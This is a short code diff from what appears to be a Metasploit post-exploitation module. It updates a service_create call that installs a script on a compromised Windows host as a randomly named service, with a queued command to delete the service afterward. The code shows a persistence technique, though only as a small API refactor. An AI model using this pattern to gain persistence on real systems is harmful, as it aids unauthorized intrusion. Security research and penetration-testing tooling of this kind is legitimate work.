@@ -140,7 +140,7 @@ class MetasploitModule < Msf::Post
       print_status("Installing as service..")
       nam = Rex::Text.rand_text_alpha(rand(8) + 8)
       print_status("Creating service #{nam}")
-      service_create(nam, nam, "cmd /c \"#{script_on_target}\"")
+      service_create(nam, :path=>"cmd /c \"#{script_on_target}\"")
       @clean_up_rc << "execute -H -f sc -a \"delete #{nam}\"\n"
     else
       print_error("Insufficient privileges to create service")
